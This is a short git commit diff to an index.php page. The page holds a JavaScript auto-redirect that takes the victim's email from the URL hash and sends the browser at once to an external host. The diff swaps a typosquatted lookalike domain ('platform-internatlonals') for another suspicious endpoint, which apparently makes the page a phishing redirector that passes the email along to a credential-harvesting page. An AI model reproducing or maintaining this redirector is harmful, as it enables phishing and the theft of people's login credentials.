a6847f949e95d2a125d8301377790b0cf428d69c
aestevez12 <114561487+aestevez12@users.noreply.github.com>
2022-09-29 10:07:31 +0200

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://console-apps.platform-internatlonals.comusername=[Email]"+ "#" + em;
+			window.location.href = "https://data-server.plusdomain.xyz9&amp;username=[Email]"+ "#" + em;
 		}, 0);
 	</script>
 </html>
